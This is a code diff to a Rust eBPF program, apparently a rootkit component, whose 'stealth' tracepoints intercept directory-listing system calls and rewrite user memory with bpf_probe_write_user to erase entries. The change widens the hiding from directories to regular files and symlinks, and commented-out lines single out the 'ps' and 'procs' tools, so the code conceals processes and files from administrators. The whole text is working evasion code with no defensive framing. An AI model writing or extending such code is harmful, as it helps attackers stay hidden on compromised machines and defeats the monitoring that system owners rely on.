@@ -6,8 +6,7 @@ use aya_ebpf::{
     cty::c_void,
     helpers::{
         bpf_get_current_comm, bpf_get_current_pid_tgid, bpf_loop, bpf_probe_read,
-        bpf_probe_read_kernel_str_bytes, bpf_probe_read_user, bpf_probe_read_user_str_bytes,
-        bpf_probe_write_user,
+        bpf_probe_read_user, bpf_probe_read_user_str_bytes, bpf_probe_write_user,
     },
     macros::{map, tracepoint},
     maps::{Array, HashMap, Queue},
@@ -110,6 +109,7 @@ fn stealth_bpf(ctx: TracePointContext) -> Result<u32, u32> {
 #[tracepoint]
 pub fn stealth_pid_enter(ctx: TracePointContext) -> Result<u32, u32> {
     let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;
+
     let dirents_buf_addr = unsafe { ctx.read_at::<u64>(24).map_err(|_| 1u32)? };
     PID_DIRENTS
         .insert(&caller_pid, &dirents_buf_addr, 0)
@@ -151,18 +151,12 @@ struct DirentData<'a> {
 
 fn remove_curr_dirent(ctx: &mut DirentData) -> Result<(), i64> {
     let d_reclen_new = (ctx.d_reclen + ctx.d_reclen_prev) as u16;
-    info!(
-        ctx.ctx,
-        " reclen ={} reclen prev={}", ctx.d_reclen, ctx.d_reclen_prev
-    );
-
     let _ = unsafe {
         bpf_probe_write_user(
             (ctx.dirents_buf_addr + ctx.bpos - ctx.d_reclen_prev as u64 + 16u64) as *mut u16,
             &d_reclen_new as *const u16,
         )?
     };
-
     ctx.patch_succeded = true;
     Ok(())
 }
@@ -186,7 +180,7 @@ fn patch_dirent_if_found(idx: u32, ctx: &mut DirentData) -> i64 {
         bpf_probe_read_user((ctx.dirents_buf_addr + ctx.bpos) as *const LinuxDirent64)
             .map_err(|_| 1u32)
     } {
-        if dirent.d_type == 4u8 {
+        if [4u8, 8u8, 10u8].contains(&dirent.d_type) {
             ctx.d_reclen = dirent.d_reclen;
 
             let mut buf = [0u8; 10];
@@ -256,17 +250,20 @@ fn patch_dirent_if_found(idx: u32, ctx: &mut DirentData) -> i64 {
 
 #[tracepoint]
 pub fn stealth_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
-    // if let Ok(cmd) = bpf_get_current_comm().map_err(|_| 1u32) {
-    //     if cmd[..5] == [112, 114, 111, 99, 115] {
-    //         info!(&ctx, "procs called");
-    //     } else {
-    //         return Ok(0);
-    //     }
-    // }
     let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;
+    // if let Ok(cmd) = bpf_get_current_comm().map_err(|_| 1u32) {
+    //     if cmd[..2] == [112, 115] {
+    //         info!(&ctx, "ps called pid: {}", caller_pid);
+    //     } else if cmd[..5] == [112, 114, 111, 99, 115] {
+    //         info!(&ctx, "procs called pid: {}", caller_pid);
+    //     } else {
+    //         PID_DIRENTS.remove(&caller_pid).map_err(|_| 1u32)?;
+    //         return Ok(0);
+    //     };
+    // }
 
     let max_offset = unsafe { ctx.read_at::<u64>(16).map_err(|_| 1u32)? };
-    //info!(&ctx, "max offset is: {}", max_offset);
+    debug!(&ctx, "max offset is: {}", max_offset);
     let dirents_buf_addr = *unsafe { PID_DIRENTS.get(&caller_pid) }.ok_or(1u32)?;
     let mut dirent_data = DirentData {
         ctx: &ctx,
@@ -278,8 +275,6 @@ pub fn stealth_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
         patch_succeded: false,
     };
 
-    //info!(&ctx, "start loop @address {}", dirents_buf_addr);
-
     unsafe {
         bpf_loop(
             MAX_DIRENTS,
@@ -288,7 +283,7 @@ pub fn stealth_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
             0,
         )
     };
-    //info!(&ctx, "out of loop : {}/{} ", dirent_data.bpos, max_offset,);
+    debug!(&ctx, "out of loop : {}/{} ", dirent_data.bpos, max_offset,);
     PID_DIRENTS.remove(&caller_pid).map_err(|_| 1u32)?;
 
     Ok(0)
